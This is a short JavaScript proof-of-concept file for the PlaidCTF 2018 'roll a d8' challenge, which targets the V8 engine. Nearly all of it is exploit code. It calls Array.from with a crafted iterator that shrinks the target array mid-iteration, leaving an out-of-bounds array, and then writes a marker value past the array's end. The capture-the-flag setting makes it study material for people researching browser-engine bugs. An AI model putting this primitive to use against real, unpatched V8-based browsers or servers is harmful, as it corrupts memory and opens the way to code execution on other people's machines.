/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2019-12-14 20:18:56
 * Author: raycp
 * 
 * Last Modified: 2019-12-14 20:24:56
 * Description: poc for plaidctf 2018 roll a d8
************************************************************/
let oobArray = [];
let maxSize = 1028 * 8;
//%DebugPrint(oobArray);
//readline();
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    next() {
      let result = this.counter++;
      if (this.counter > maxSize) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });
oobArray[oobArray.length - 1] = 0x41414141;
